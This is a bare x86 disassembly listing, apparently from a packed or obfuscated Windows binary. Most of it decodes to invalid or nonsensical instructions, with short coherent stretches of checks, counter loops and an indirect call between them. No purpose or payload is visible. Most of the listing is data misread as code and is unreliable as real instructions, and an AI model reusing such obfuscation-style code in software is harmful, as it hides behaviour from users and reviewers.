  40f871:	loop   0x40f89e
  40f873:	cmp    dl,BYTE PTR [esi-0x20]
  40f876:	rol    esp,0xa0
  40f879:	sahf   
  40f87a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f87b:	inc    esi
  40f87c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f87d:	jle    0x40f8b1
  40f87f:	fmulp  st(5),st
  40f881:	(bad)  
  40f883:	test   eax,0x83d1c5e4
  40f888:	mov    cl,0xa6
  40f88a:	fnstcw WORD PTR [ebx-0xbe84a43]
  40f890:	cwde   
  40f891:	mov    eax,ds:0xf6da2be8
  40f896:	imul   ebp,esp,0x4f1533cc
  40f89c:	aam    0x8b
  40f89e:	mov    DWORD PTR [esi+0x6c4219f2],0x4ee891e3
  40f8a8:	js     0x40f878
  40f8aa:	mov    esp,DWORD PTR [esi+0x6f]
  40f8ad:	shr    DWORD PTR [ecx-0x6ae84159],1
  40f8b3:	dec    eax
  40f8b4:	or     bh,BYTE PTR [ebx+ebp*8-0x7d]
  40f8b8:	and    edi,DWORD PTR [eax+0x345fa096]
  40f8be:	xor    eax,DWORD PTR [ecx-0x36]
  40f8c1:	xor    al,0x52
  40f8c3:	adc    ebx,ecx
  40f8c5:	and    eax,0xd8f1f582
  40f8ca:	in     al,dx
  40f8cb:	ins    BYTE PTR es:[edi],dx
  40f8cc:	ret    
  40f8cd:	xchg   ch,ah
  40f8cf:	lods   al,BYTE PTR ds:[esi]
  40f8d0:	sahf   
  40f8d1:	dec    esi
  40f8d2:	fnstenv [edi]
  40f8d4:	or     DWORD PTR [edi-0x1f],esp
  40f8d7:	imul   ecx,DWORD PTR [eax+ecx*2+0x2b6210f0],0x1d29a41e
  40f8e2:	mov    eax,DWORD PTR [ebp-0x4]
  40f8e5:	mov    ecx,DWORD PTR [ebp+0xc]
  40f8e8:	xor    DWORD PTR ds:0x43463f,0x4346cf
  40f8f2:	xor    eax,edi
  40f8f4:	add    eax,esi
  40f8f6:	mov    DWORD PTR ds:0x43468b,0x4bab
  40f900:	cmp    eax,ecx
  40f902:	mov    DWORD PTR ds:0x43470f,0x3e53
  40f90c:	je     0x40fd56
  40f912:	and    DWORD PTR ds:0x434693,edi
  40f918:	mov    eax,DWORD PTR [ebp-0x4]
  40f91b:	mov    edx,DWORD PTR ds:0x4345eb
  40f921:	xor    DWORD PTR ds:0x434653,edx
  40f927:	xor    eax,edi
  40f929:	and    DWORD PTR ds:0x4346bf,0x0
  40f933:	mov    edx,DWORD PTR ds:0x4346bf
  40f939:	inc    edx
  40f93a:	mov    DWORD PTR ds:0x4346bf,edx
  40f940:	cmp    DWORD PTR ds:0x4346bf,0x9
  40f947:	jne    0x40f96a
  40f94d:	push   0x43464b
  40f952:	push   0x434792
  40f957:	push   0x7b5f
  40f95c:	push   0x5aad
  40f961:	push   DWORD PTR [ebp-0xc]
  40f964:	call   DWORD PTR ds:0x4132a4
  40f96a:	cmp    DWORD PTR ds:0x4346bf,0x8
  40f971:	jne    0x40f986
  40f977:	xor    edx,edx
  40f979:	xor    edx,DWORD PTR ds:0x4346bf
  40f97f:	inc    edx
  40f980:	mov    DWORD PTR ds:0x4346bf,edx
  40f986:	cmp    DWORD PTR ds:0x4346bf,0x10
  40f98d:	jb     0x40f933
  40f993:	and    DWORD PTR ds:0x4346bf,edx
  40f999:	add    eax,esi
  40f99b:	push   eax
  40f99c:	push   DWORD PTR [ebp-0x8]
  40f99f:	push   DWORD PTR [ebp-0x4]
  40f9a2:	mov    edx,DWORD PTR ds:0x414afe
  40f9a8:	jmp    0x40fd3b
  40f9ad:	pop    ebx
  40f9ae:	pop    edi
  40f9af:	cld    
  40f9b0:	sub    edi,esp
  40f9b2:	mov    ebp,0x81a66f6d
  40f9b7:	push   esi
  40f9b8:	in     eax,dx
  40f9b9:	xor    bh,BYTE PTR [ecx-0x5e]
  40f9bc:	mov    eax,ds:0x7e7ebd14
  40f9c1:	hlt    
  40f9c2:	jns    0x40fa42
  40f9c4:	jle    0x40fa00
  40f9c6:	fwait
  40f9c7:	or     eax,0x7e854c52
  40f9cc:	in     eax,dx
  40f9cd:	and    eax,0xcc268590
  40f9d2:	data16 jae 0x40f96c
  40f9d5:	jmp    0x1814ee36
  40f9da:	imul   ecx,ebp,0x48c7614
  40f9e0:	adc    al,BYTE PTR [edx+0x18]
  40f9e3:	pushf  
  40f9e4:	sbb    esp,DWORD PTR [esp+ebp*1-0xefc7970]
  40f9eb:	mov    dl,0x3b
  40f9ed:	sbb    DWORD PTR [edx+0x3a58d8b5],esi
  40f9f3:	in     eax,0x31
  40f9f5:	jmp    0xe434:0x64e7a1f0
  40f9fc:	(bad)  
  40f9fd:	fisubr DWORD PTR [esi]
  40f9ff:	jp     0x40fa7d
  40fa01:	pop    esi
  40fa02:	mov    WORD PTR [edi-0x5b],ds
  40fa05:	xchg   edx,eax
  40fa06:	dec    edi
  40fa07:	into   
  40fa08:	scas   al,BYTE PTR es:[edi]
  40fa09:	mov    BYTE PTR ds:0x66debdd7,cl
  40fa0f:	sbb    BYTE PTR [edi+0x860d857],bh
  40fa15:	out    0x2f,eax
  40fa17:	sbb    esi,DWORD PTR [edx-0x7dcf5829]
  40fa1d:	pop    eax
  40fa1e:	fcmovb st,st(3)
  40fa20:	sub    DWORD PTR [esi-0x4a],esp
  40fa23:	loope  0x40fa37
  40fa25:	ret    0xdb61
  40fa28:	pop    edx
  40fa29:	pop    esi
  40fa2a:	jp     0x40fa45
  40fa2c:	dec    esp
  40fa2d:	dec    edi
  40fa2e:	cld    
  40fa2f:	jle    0x40fa59
  40fa31:	add    BYTE PTR [eax+0x6e0f906e],ah
  40fa37:	or     DWORD PTR [eax-0x42],0xefae7190
  40fa3e:	mov    al,0xf1
  40fa40:	inc    edi
  40fa41:	add    bl,dl
  40fa43:	cli    
  40fa44:	mov    es,WORD PTR [ebp+0x201c297a]
  40fa4a:	imul   ecx,DWORD PTR [edi+0x7c],0xffffffef
  40fa4e:	fs es popa 
  40fa51:	repnz arpl WORD PTR [ebp+0x5a],ax
  40fa55:	les    esp,FWORD PTR [esi-0x556f3ebc]
  40fa5b:	mov    dl,0xea
  40fa5d:	mov    bl,0xec
  40fa5f:	pop    eax
  40fa60:	iret   
  40fa61:	sub    DWORD PTR [eax-0x668f9126],ebx
  40fa67:	mov    dl,0xe9
  40fa69:	xor    al,0x1f
  40fa6b:	mov    dl,0xd6
  40fa6d:	sub    eax,0xea2e3017
  40fa72:	lahf   
  40fa73:	repz clc 
  40fa75:	ss mov dh,0xda
  40fa78:	popa   
  40fa79:	xchg   BYTE PTR [ebp-0x6e3525bc],ch
  40fa7f:	stos   BYTE PTR es:[edi],al
  40fa80:	inc    ecx
  40fa81:	mov    WORD PTR [esi],?
  40fa83:	(bad)  
  40fa84:	int    0x1e
  40fa86:	xor    DWORD PTR [edx+0x5f],ebx
  40fa89:	leave  
  40fa8a:	push   ss
  40fa8b:	popa   
  40fa8c:	jns    0x40fa66
  40fa8e:	scas   eax,DWORD PTR es:[edi]
  40fa8f:	pop    eax
  40fa90:	(bad)
  40fa93:	div    DWORD PTR [ecx]
  40fa95:	repz mov edx,0x1681b889
  40fa9b:	inc    esi
  40fa9c:	jle    0x40fafc
  40fa9e:	push   0xbdf394e6
  40faa3:	jb     0x40fabb
  40faa5:	jno    0x40fa4e
  40faa7:	and    eax,0x65626f50
  40faac:	push   cs
  40faad:	mov    ebx,0x1c3c28fa
  40fab2:	popa   
  40fab3:	call   0x75ac:0xd89a29e1
  40faba:	or     al,0xf3
  40fabc:	pop    esp
  40fabd:	sub    BYTE PTR [ebx-0x4b],ah
  40fac0:	dec    esi
  40fac1:	xchg   edx,eax
  40fac2:	(bad)  
  40fac3:	mov    dh,0x37
  40fac5:	adc    bh,BYTE PTR [esi+esi*4]
  40fac8:	lock les esp,FWORD PTR ds:0x5f3c44bd
  40facf:	cmp    bh,BYTE PTR [esi]
  40fad1:	(bad)  
  40fad2:	loop   0x40fb18
  40fad4:	out    dx,al
  40fad5:	and    bh,al
  40fad7:	and    al,0x14
  40fad9:	sbb    al,0xd7
  40fadb:	dec    esp
  40fadc:	jmp    0x70c:0xb3487ce
  40fae3:	xchg   ebx,eax
  40fae4:	call   0xd6788640
  40fae9:	inc    ecx
  40faea:	xor    al,0xd1
  40faec:	mov    ah,0xe4
  40faee:	lods   al,BYTE PTR ds:[esi]
  40faef:	xor    al,0x82
  40faf1:	adc    al,0x46
  40faf3:	cld    
  40faf4:	fldl2t 
  40faf6:	pop    es
  40faf7:	or     al,0x33
  40faf9:	js     0x40fa8e
  40fafb:	and    BYTE PTR es:[edx],ch
  40fafe:	call   0x1b4ff65
  40fb03:	mov    eax,0x16d17589
  40fb09:	or     cl,dl
  40fb0b:	iret   
  40fb0c:	pop    ebp
  40fb0d:	inc    ebx
  40fb0e:	and    eax,0x36d5f478
  40fb14:	cmp    BYTE PTR [edi-0x14],cl
  40fb17:	mov    ecx,?
  40fb19:	lahf   
  40fb1a:	mov    DWORD PTR [esi],edx
  40fb1c:	push   ebx
  40fb1d:	aad    0xdd
  40fb1f:	call   0xceacbcf5
  40fb24:	xor    al,0xf7
  40fb26:	in     eax,dx
  40fb27:	push   esi
  40fb28:	and    DWORD PTR [esi+0x51],0xf062d8b5
  40fb2f:	pop    ss
  40fb30:	loopne 0x40fb3e
  40fb32:	lods   eax,DWORD PTR ds:[esi]
  40fb33:	fwait
  40fb34:	mov    ch,0x4d
  40fb36:	xor    BYTE PTR [edi+0x43],cl
  40fb39:	inc    edx
  40fb3a:	and    BYTE PTR [eax-0x56bfa600],al
  40fb40:	lock xlat BYTE PTR ds:[ebx]
  40fb42:	test   bl,dh
  40fb44:	hlt    
  40fb45:	sbb    edx,esi
  40fb47:	pushf  
  40fb48:	add    BYTE PTR [esp+ebp*4],ch
  40fb4b:	lods   eax,DWORD PTR ds:[esi]
  40fb4c:	pusha  
  40fb4d:	in     eax,0xca
  40fb4f:	jo     0x40fbc3
  40fb51:	cs sbb al,0xc1
  40fb54:	mov    esi,0xcc64d0ae
  40fb59:	adc    al,0x18
  40fb5b:	mov    al,0x11
  40fb5d:	ret    
  40fb5e:	lods   al,BYTE PTR ds:[esi]
  40fb5f:	push   ebp
  40fb60:	mov    ch,0x65
  40fb62:	jae    0x40fb10
  40fb64:	cdq    
  40fb65:	cs ins BYTE PTR es:[edi],dx
  40fb67:	stos   DWORD PTR es:[edi],eax
  40fb68:	dec    esp
  40fb69:	jmp    0xdb34:0x2bc3d50e
  40fb70:	fiadd  DWORD PTR [eax]
  40fb73:	dec    esp
  40fb74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb75:	mov    dh,0xe2
  40fb77:	pop    ds
  40fb78:	out    0x3,eax
  40fb7a:	aas    
  40fb7b:	xchg   edi,eax
  40fb7c:	pcmpeqd mm1,mm2
  40fb7f:	es jmp 0xc4019366
  40fb85:	xchg   ebp,eax
  40fb86:	or     eax,0xde782588
  40fb8b:	and    al,dh
  40fb8d:	ins    BYTE PTR es:[edi],dx
  40fb8e:	test   al,0x3e
  40fb90:	push   esp
  40fb91:	lds    edi,FWORD PTR [esi]
  40fb93:	mov    edx,0xb47081e8
  40fb98:	pop    edx
  40fb99:	ror    DWORD PTR [edi],cl
  40fb9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb9c:	out    0xda,eax
  40fb9e:	mov    esi,0xc6ce01a9
  40fba3:	fisttp DWORD PTR [esi-0x137242be]
  40fba9:	dec    eax
  40fbaa:	dec    ecx
  40fbab:	imul   esi,DWORD PTR [ecx+eiz*2],0xbf1544eb
  40fbb2:	ret    0x6ea
  40fbb5:	ror    DWORD PTR [esp+ebx*4-0x9],1
  40fbb9:	sbb    BYTE PTR [ebx+0x4f],0x69
  40fbbd:	sbb    DWORD PTR [ebx-0x60],0x5f
  40fbc1:	aad    0x5a
  40fbc3:	sbb    esi,eax
  40fbc5:	in     eax,0x98
  40fbc7:	inc    ebx
  40fbc8:	aam    0xc
  40fbca:	push   esp
  40fbcb:	mov    ?,WORD PTR [ebx]
  40fbcd:	fs test eax,0x84e2597c
  40fbd3:	loop   0x40fc40
  40fbd5:	mov    ebx,0x10a4c4f0
  40fbda:	(bad)  
  40fbdb:	cmp    BYTE PTR [edi-0x30],al
  40fbde:	nop
  40fbdf:	jns    0x40fbf4
  40fbe1:	daa    
  40fbe2:	ficom  DWORD PTR [ebp+0x6a]
  40fbe5:	jbe    0x40fc29
  40fbe7:	or     al,0x93
  40fbe9:	adc    al,0x9a
  40fbeb:	rcr    DWORD PTR [edx+0x41f6ac32],1
  40fbf1:	sbb    ch,BYTE PTR [ecx+0x61]
  40fbf4:	scas   al,BYTE PTR es:[edi]
  40fbf5:	jnp    0x40fbae
  40fbf7:	loopne 0x40fc2e
  40fbf9:	pop    ecx
  40fbfa:	inc    edi
  40fbfb:	xor    BYTE PTR [esi],bl
  40fbfd:	adc    ch,dh
  40fbff:	add    al,0xec
  40fc01:	pop    es
  40fc02:	test   BYTE PTR ds:0xa07388e1,bh
  40fc08:	dec    eax
  40fc09:	in     al,dx
  40fc0a:	popf   
  40fc0b:	and    al,0x64
  40fc0d:	pop    es
  40fc0e:	adc    DWORD PTR [ebx+0x2],esi
  40fc11:	loope  0x40fb95
  40fc13:	mov    ebx,0xc988b460
  40fc18:	pop    edx
  40fc19:	mov    ds:0xb4ac72fb,al
  40fc1e:	lods   eax,DWORD PTR ds:[esi]
  40fc1f:	sbb    BYTE PTR [edx-0x38],dl
  40fc22:	sbb    ah,BYTE PTR ss:[ecx]
  40fc25:	lea    eax,[eax-0x4eb5aa0d]
  40fc2b:	or     DWORD PTR [edx],edx
  40fc2d:	mov    bh,0x66
  40fc2f:	mov    ebx,DWORD PTR [esi]
  40fc31:	or     ecx,ebp
  40fc33:	mov    dh,0xf8
  40fc35:	stos   BYTE PTR es:[edi],al
  40fc36:	shl    BYTE PTR [edx-0x1d1db64f],cl
  40fc3c:	aad    0xa8
  40fc3e:	adc    DWORD PTR [ecx],edi
  40fc40:	out    dx,eax
  40fc41:	mov    ebp,0xd8d3b988
  40fc46:	retf   
  40fc47:	mov    edx,0x4964aef4
  40fc4c:	imul   BYTE PTR ds:0x8ff8f06a
  40fc52:	aaa    
  40fc53:	mov    eax,ds:0xe5f3ea5c
  40fc58:	jnp    0x40fc9c
  40fc5a:	mul    BYTE PTR [edi-0x33fc98f3]
  40fc60:	xchg   ecx,esp
  40fc62:	leave  
  40fc63:	in     eax,0x5b
  40fc65:	loopne 0x40fc4d
  40fc67:	add    cl,ah
  40fc69:	mov    al,ds:0xc455d854
  40fc6e:	ret    0xa8a2
  40fc71:	daa    
  40fc72:	pop    es
  40fc73:	jge    0x40fc60
  40fc75:	mov    bh,0x39
  40fc77:	push   ebx
  40fc78:	aad    0xd9
  40fc7a:	push   cs
  40fc7b:	push   edi
  40fc7c:	test   eax,0x3cd1b4f7
  40fc81:	push   ecx
  40fc82:	mov    esp,0x72d05538
  40fc87:	inc    edx
  40fc88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc89:	es xchg ecx,eax
  40fc8b:	mov    dh,BYTE PTR [esi-0x2e8855a3]
  40fc91:	lods   eax,DWORD PTR ds:[esi]
  40fc92:	out    dx,al
  40fc93:	mov    al,0xd1
  40fc95:	push   eax
  40fc96:	pop    es
  40fc97:	in     al,dx
  40fc98:	fistp  QWORD PTR [eax+0x75e0a80]
  40fc9e:	jmp    0xee56:0x52f1588
  40fca5:	add    al,0x9c
  40fca7:	xchg   bl,ah
  40fca9:	pop    ebx
  40fcaa:	add    ebx,DWORD PTR [edi+edx*4-0x654d7a6b]
  40fcb1:	mov    bl,0xdb
  40fcb3:	rcr    bl,cl
  40fcb5:	scas   eax,DWORD PTR es:[edi]
  40fcb6:	xchg   edx,eax
  40fcb7:	sbb    cl,ch
  40fcb9:	stos   DWORD PTR es:[edi],eax
  40fcba:	adc    DWORD PTR [ebx-0x5f1c3bdd],ebp
  40fcc0:	cmp    DWORD PTR [edi-0x418ba4b4],esp
  40fcc6:	in     eax,0x11
  40fcc8:	sbb    al,0x53
  40fcca:	add    edi,ebx
  40fccc:	mov    ebx,DWORD PTR [eiz*4+0x5a3a6807]
  40fcd3:	mov    bl,0x9f
  40fcd5:	mov    ecx,DWORD PTR [esi-0x10]
  40fcd8:	aad    0x6e
  40fcda:	mov    esi,0xcdc94448
  40fcdf:	mov    ds:0xd422f89d,eax
  40fce4:	and    al,0xfc
  40fce6:	or     al,0x13
  40fce8:	mov    BYTE PTR [edx],bh
  40fcea:	and    al,BYTE PTR [eax-0x44]
  40fced:	sbb    eax,0xd37f65c4
  40fcf2:	test   al,0xa0
  40fcf4:	pop    esp
  40fcf5:	cmp    BYTE PTR [ebp+edi*2+0x45],dh
  40fcf9:	(bad)  
  40fcfa:	or     al,0x4f
  40fcfc:	test   bh,ch
  40fcfe:	outs   dx,DWORD PTR ds:[esi]
  40fcff:	jmp    0x40fd23
  40fd01:	sbb    BYTE PTR [ebx-0xbb92825],al
  40fd07:	sbb    al,0x6b
  40fd09:	mov    ss,WORD PTR [ebx]
  40fd0b:	(bad)  
  40fd0c:	cmp    bh,BYTE PTR [edx+0x3e]
  40fd0f:	adc    BYTE PTR [edi],0xb7
  40fd12:	xchg   ebx,eax
  40fd13:	cdq    
  40fd14:	sub    DWORD PTR [ecx-0x52],edi
  40fd17:	ins    DWORD PTR es:[edi],dx
  40fd18:	dec    eax
  40fd19:	scas   al,BYTE PTR es:[edi]
  40fd1a:	into   
  40fd1b:	mov    WORD PTR [ecx+edx*1-0x54bc5f54],gs
  40fd22:	es dec ebp
  40fd24:	jb     0x40fd88
  40fd26:	sbb    DWORD PTR [eax],esi
  40fd28:	dec    ebx
  40fd29:	popf   
  40fd2a:	cmp    DWORD PTR [edi+0x1d],esi
  40fd2d:	and    bl,BYTE PTR [edi+0x55]
  40fd30:	cmp    BYTE PTR [ebp+0x22],ah
  40fd33:	daa    
  40fd34:	inc    ebp
  40fd35:	std    
  40fd36:	cmp    al,0x78
  40fd38:	fidivr WORD PTR [edx+0xc4ae82e]
  40fd3e:	add    BYTE PTR [eax],al
  40fd40:	mov    ecx,DWORD PTR ds:0x414afe
  40fd46:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40fd4c:	mov    DWORD PTR [ecx],eax
  40fd4e:	mov    eax,DWORD PTR [ebp-0x8]
  40fd51:	jmp    0x410121
  40fd56:	mov    eax,DWORD PTR [ebp-0x4]
  40fd59:	mov    ecx,DWORD PTR [ebp+0x10]
  40fd5c:	xor    eax,edi
  40fd5e:	add    eax,esi
  40fd60:	cmp    eax,ecx
  40fd62:	jne    0x41011e
  40fd68:	mov    eax,DWORD PTR [ebp-0x4]
  40fd6b:	xor    eax,edi
  40fd6d:	add    eax,esi
  40fd6f:	mov    ds:0x414b82,eax
  40fd74:	mov    eax,DWORD PTR [ebp-0x4]
  40fd77:	xor    eax,edi
  40fd79:	add    eax,esi
  40fd7b:	mov    ds:0x414b7a,eax
  40fd80:	push   DWORD PTR [ebp-0x8]
  40fd83:	push   DWORD PTR [ebp-0x4]
  40fd86:	call   0x408384
  40fd8b:	jmp    0x41011e
  40fd90:	in     eax,0x27
  40fd92:	ss xor bh,ah
  40fd95:	xor    esp,ebp
  40fd97:	icebp  
  40fd98:	add    DWORD PTR [eax+esi*4+0x77],edi
  40fd9c:	ficomp WORD PTR [eax-0x477d02ea]
  40fda2:	jle    0x40fe22
  40fda4:	hlt    
  40fda5:	jns    0x40fe25
  40fda7:	jle    0x40fd5c
  40fda9:	mov    ah,0x1a
  40fdab:	sbb    DWORD PTR [esi],0x96e70a02
  40fdb1:	in     al,0x5d
  40fdb3:	daa    
  40fdb4:	inc    esi
  40fdb5:	xor    BYTE PTR [edi+0x7f],bl
  40fdb8:	fsubrp st(3),st
  40fdba:	fist   WORD PTR [ebx+0xce0070b]
  40fdc0:	or     dl,ch
  40fdc2:	mov    ecx,0x5c009a1a
  40fdc7:	adc    DWORD PTR [ebp+0x9c284c3],ecx
  40fdcd:	aad    0x7c
  40fdcf:	push   edi
  40fdd0:	or     BYTE PTR [ecx+edx*2+0x3609a282],0xa1
  40fdd8:	iret   
  40fdd9:	or     esp,esp
  40fddb:	dec    edi
  40fddc:	addr16 inc edi
  40fdde:	test   BYTE PTR [edx+0x50b92a12],al
  40fde4:	xchg   esi,eax
  40fde5:	retf   0xe215
  40fde8:	data16 jg 0x40fe34
  40fdeb:	(bad)
  40fdef:	shl    DWORD PTR [ebp+edi*2+0x2a],0x87
  40fdf4:	mov    ebp,0x2bd87b4d
  40fdf9:	inc    ebp
  40fdfa:	jge    0x40fdd3
  40fdfc:	mul    BYTE PTR [ebx-0x77]
  40fdff:	push   esp
  40fe00:	test   eax,0x6d2235e4
  40fe05:	in     al,dx
  40fe06:	in     eax,0xac
  40fe08:	push   ebx
  40fe09:	jnp    0x40fd97
  40fe0b:	pop    ds
  40fe0c:	in     eax,dx
  40fe0d:	xchg   edi,eax
  40fe0e:	push   0x4d489138
  40fe13:	jg     0x40fe8b
  40fe15:	sbb    DWORD PTR [eax-0x599288d3],edx
  40fe1b:	in     eax,dx
  40fe1c:	mov    ebp,0x3b395aed
  40fe21:	sbb    al,0xdc
  40fe23:	sti    
  40fe24:	pop    ecx
  40fe25:	push   esp
  40fe26:	xchg   esi,eax
  40fe27:	mov    ch,0x67
  40fe29:	jno    0x40fe6b
  40fe2b:	ss ret 
  40fe2d:	out    0x24,al
  40fe2f:	stos   BYTE PTR es:[edi],al
  40fe30:	jne    0x40fe79
  40fe32:	icebp  
  40fe33:	adc    BYTE PTR [ecx-0x5f147a4f],0x52
  40fe3a:	fmul   DWORD PTR ds:0x386d92a0
  40fe40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe41:	sbb    BYTE PTR [ebx-0x8a2d017],cl
  40fe47:	icebp  
  40fe48:	sbb    al,0xc6
  40fe4a:	fiadd  WORD PTR [ebx+eax*8-0x475b84e]
  40fe51:	xchg   ebx,eax
  40fe52:	aam    0xf3
  40fe54:	imul   DWORD PTR [eax+0x1]
  40fe57:	xchg   edx,eax
  40fe58:	test   DWORD PTR ds:0xf39c09a6,ebx
  40fe5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe5f:	inc    ebp
  40fe60:	xor    al,0xff
  40fe62:	or     eax,0xab80009a
  40fe67:	and    DWORD PTR [edx-0x7717761a],0x4f
  40fe6e:	pop    edx
  40fe6f:	push   0x3a
  40fe71:	leave  
  40fe72:	jae    0x40fe26
  40fe74:	mov    ebp,0x3c1d6816
  40fe79:	inc    edi
  40fe7a:	dec    ecx
  40fe7b:	fcmovnbe st,st(1)
  40fe7d:	sub    eax,0x14eb0343
  40fe82:	push   es
  40fe83:	push   edi
  40fe84:	xchg   esi,eax
  40fe85:	test   eax,0x422b7e50
  40fe8a:	push   0xff433a9e
  40fe8f:	and    BYTE PTR [eax-0x3e],cl
  40fe92:	int3   
  40fe93:	int    0x72
  40fe95:	gs xchg ecx,eax
  40fe97:	add    dl,BYTE PTR [ecx-0x27]
  40fe9a:	jmp    0xdd79:0xd3dbf4f6
  40fea1:	jmp    0x40fec0
  40fea3:	push   eax
  40fea4:	xchg   ebp,eax
  40fea5:	pop    es
  40fea6:	push   0xc
  40fea8:	jo     0x40fe3c
  40feaa:	and    cl,BYTE PTR [ebx]
  40feac:	cmp    eax,0x59b17ca7
  40feb1:	test   cl,bh
  40feb3:	xor    al,0xe9
  40feb5:	addr16 mov ch,0x3a
  40feb8:	not    al
  40feba:	sub    BYTE PTR [edx-0x60f488b7],ah
  40fec0:	cdq    
  40fec1:	jmp    0x504755f7
  40fec6:	pop    ebp
  40fec7:	(bad)  
  40fec8:	inc    ebx
  40fec9:	sub    al,0xc1
  40fecb:	cmp    al,0x4e
  40fecd:	mov    ch,0x80
  40fecf:	aam    0xc9
  40fed1:	jno    0x40fefd
  40fed3:	push   edx
  40fed4:	nop
  40fed5:	or     al,0x48
  40fed7:	sub    eax,0xa21ffd4e
  40fedc:	sti    
  40fedd:	rol    esp,1
  40fedf:	xor    ah,BYTE PTR [edx-0x1100430e]
  40fee5:	retf   0xebcf
  40fee8:	sahf   
  40fee9:	arpl   WORD PTR [eax+0x45],ax
  40feec:	(bad)  
  40feed:	stc    
  40feee:	loope  0x40fe89
  40fef0:	jno    0x40feb3
  40fef2:	cdq    
  40fef3:	push   ebp
  40fef4:	dec    ebx
  40fef5:	(bad)  
  40fef6:	adc    al,0x65
  40fef8:	pop    es
  40fef9:	repz out 0x22,eax
  40fefc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fefd:	addr16 inc ecx
  40feff:	pop    esp
  40ff00:	fisttp WORD PTR ds:0x8d4866a0
  40ff06:	sub    al,ch
  40ff08:	and    DWORD PTR [ebx],edi
  40ff0a:	sahf   
  40ff0b:	mov    ebx,0x14aa5b57
  40ff10:	mov    ds:0x5cd68cc5,al
  40ff15:	stos   BYTE PTR es:[edi],al
  40ff16:	fdiv   DWORD PTR [ecx]
  40ff18:	retf   0x49ff
  40ff1b:	aas    
  40ff1c:	xor    bh,bl
  40ff1e:	das    
  40ff1f:	dec    cx
  40ff21:	loop   0x40ff94
  40ff23:	push   edx
  40ff24:	fsubr  DWORD PTR [ebx+0x26]
  40ff27:	cdq    
  40ff28:	jg     0x40ff83
  40ff2a:	test   BYTE PTR [eax-0x2ca4d41f],cl
  40ff30:	pop    es
  40ff31:	adc    eax,0xd914cfd2
  40ff36:	push   esp
  40ff37:	jns    0x40ff32
  40ff39:	(bad)  
  40ff3a:	push   esi
  40ff3b:	mov    eax,0x6cc3d2cf
  40ff40:	pusha  
  40ff41:	ja     0x40ff47
  40ff43:	mov    ds:0x6f56e8b4,eax
  40ff48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff49:	sub    ebp,DWORD PTR [edi+0x67]
  40ff4c:	stos   BYTE PTR es:[edi],al
  40ff4d:	invlpg BYTE PTR [ecx-0x65]
  40ff51:	in     al,dx
  40ff52:	mov    bh,0x8
  40ff54:	sub    BYTE PTR [edx],al
  40ff56:	test   eax,ecx
  40ff58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff59:	fcmovne st,st(4)
  40ff5b:	adc    DWORD PTR [eax],0x57
  40ff5e:	mov    bh,0x7f
  40ff60:	xlat   BYTE PTR ds:[ebx]
  40ff61:	shl    DWORD PTR [esi],0xaf
  40ff64:	jge    0x40ffb2
  40ff66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff67:	aad    0x32
  40ff69:	inc    edi
  40ff6a:	dec    edi
  40ff6b:	ret    0x43bb
  40ff6e:	pop    ds
  40ff6f:	fwait
  40ff70:	or     bl,ah
  40ff72:	xor    BYTE PTR [edx+0x660fa78d],dl
  40ff78:	fld    TBYTE PTR ds:0xe30f0c82
  40ff7e:	jmp    0x4403:0xd01c3b7b
  40ff85:	push   edi
  40ff86:	add    eax,0xd3767b59
  40ff8b:	ror    ebp,1
  40ff8d:	nop
  40ff8e:	retf   
  40ff8f:	sbb    eax,0xb0cfb91e
  40ff94:	mov    ah,0xb3
  40ff96:	cmp    dh,ah
  40ff98:	gs push ebx
  40ff9a:	mov    eax,0x8ffd8518
  40ff9f:	pop    ecx
  40ffa0:	daa    
  40ffa1:	push   eax
  40ffa2:	inc    edi
  40ffa3:	lahf   
  40ffa4:	int3   
  40ffa5:	mov    eax,ds:0xfc660ef4
  40ffaa:	ds mov ?,esp
  40ffad:	test   al,0xec
  40ffaf:	rcl    BYTE PTR [eax+0x6],cl
  40ffb2:	mov    BYTE PTR [edi+edx*4],ah
  40ffb5:	jo     0x410032
  40ffb7:	into   
  40ffb8:	adc    ebx,ebp
  40ffba:	mov    dl,0xb0
  40ffbc:	or     dh,BYTE PTR [eax]
  40ffbe:	xchg   esp,eax
  40ffbf:	pop    edi
  40ffc0:	jl     0x41002b
  40ffc2:	cmp    bh,BYTE PTR [esi+0x5]
  40ffc5:	mov    es,ecx
  40ffc7:	outs   dx,BYTE PTR ds:[esi]
  40ffc8:	mov    ds:0xd2eb8ce8,eax
  40ffcd:	or     al,0xf9
  40ffcf:	dec    ecx
  40ffd0:	mov    ah,0xe1
  40ffd2:	imul   esi,DWORD PTR [eax],0x48
  40ffd5:	mov    esi,0x66398387
  40ffda:	pop    eax
  40ffdb:	add    al,0xae
  40ffdd:	mov    al,0x8
  40ffdf:	dec    edi
  40ffe0:	pop    edx
  40ffe1:	or     BYTE PTR [ebp-0x59],ah
  40ffe4:	sub    DWORD PTR [edi+0x2b29dec9],ecx
  40ffea:	dec    ebp
  40ffeb:	imul   esp,DWORD PTR [edx-0x27],0x2260b1f
  40fff2:	repnz inc esp
  40fff4:	aad    0x55
  40fff6:	inc    esp
  40fff7:	xchg   edi,eax
  40fff8:	xchg   edi,eax
  40fff9:	pop    ds
  40fffa:	or     edi,ecx
  40fffc:	test   dh,bl
  40fffe:	sub    dl,BYTE PTR [ebp-0x11a3e362]
  410004:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410005:	mov    bl,0x34
  410007:	or     al,0x71
  410009:	pop    ebp
  41000a:	ret    
  41000b:	cs fwait
  41000d:	ja     0x41005d
  41000f:	and    ebp,DWORD PTR [edi+0x58]
  410012:	xor    al,0x31
  410014:	sub    DWORD PTR [eax],edi
  410016:	mov    al,ds:0x89cfb7d8
  41001b:	and    BYTE PTR ds:0x63745fdf,0xa2
  410022:	dec    ecx
  410023:	lock dec esp
  410025:	ret    0x87a5
  410028:	cli    
  410029:	mov    ch,0xfd
  41002b:	jno    0x40ffbe
